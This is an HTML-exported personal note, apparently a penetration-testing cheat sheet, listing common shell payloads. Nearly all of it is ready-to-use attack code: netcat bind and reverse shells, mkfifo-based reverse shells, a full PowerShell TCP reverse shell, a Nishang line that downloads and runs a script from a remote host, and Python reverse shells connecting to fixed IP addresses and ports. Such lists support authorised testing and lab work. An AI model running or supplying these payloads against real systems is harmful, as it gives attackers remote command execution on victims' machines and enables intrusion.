<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Common Shell Payloads</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Common Shell Payloads</h1><br/><p>Already in the webpages.</p><p></p><p>https://www.revshells.com/</p><p>https://cybexray.github.io/revshell/revshell.html</p><p></p><p></p><p><strong>Netcat:</strong></p><p>Windows Binaries in Kali Linux - /usr/share/windows-resources/binaries</p><p></p><p>-e		:	This option allows you to execute a process on connection</p><p></p><p>Bind Shell (Target Side)</p><p>nc -lvnp &lt;Local-PORT&gt; -e /bin/bash</p><p></p><p>Attacker would connect to this bind shell using: nc &lt;Target-IP&gt; &lt;Target-PORT&gt;</p><p></p><p>Reverse Shell (Target Side)</p><p>nc &lt;Attacker-IP&gt; &lt;Attacker-PORT&gt; -e /bin/bash</p><p></p><p><strong>Note:</strong> The -e option is only included in the traditional versions of netcat and not included in modern versions.</p><p>Thus consider the following work around.</p><p></p><p>For Windows it won&#39;t be an issue as we will use our own nc binary most of the time. </p><p>For Linux(Having newer version of nc) use the following</p><p></p><p>Bind Shell</p><p>mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</p><p>Reverse Shell</p><p>mkfifo /tmp/f; nc &lt;Attacker-IP&gt; &lt;Attacker-PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</p><p></p><p><strong>Windows Powershell Reverse Shell:</strong></p><p></p><p>powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;Attacker-IP&gt;&#39;,&lt;Attacker-PORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</p><p></p><p><strong>Windows Powershell Reverse Shell using Nishang scripts:</strong></p><p><em>cd /opt</em></p><p><em>git clone https://github.com/samratashok/nishang.git</em></p><p><em>cd /opt/nishang/Shells</em></p><p></p><p><strong>Note:</strong> We have to host the Invoke-PowerShellTcp.ps1 file with <em>python2 -m SimpleHTTPServer 80</em></p><p></p><p><em>powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.11.72.31:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress 10.11.72.31 -Port 7777</em></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Python Shell Code (Uses Subprocess)</span></strong></p><p><strong>One Liner for bash script or command</strong></p><p>#!/bin/bash</p><p>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.11.72.31&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</p><p></p><p><strong>Python program</strong></p><p>import socket,subprocess,os</p><p></p><p>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p><p>s.connect((&quot;10.8.50.72&quot;,5555))</p><p>os.dup2(s.fileno(),0)</p><p>os.dup2(s.fileno(),1)</p><p>os.dup2(s.fileno(),2)</p><p>p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</p></div>
</body>
</html>
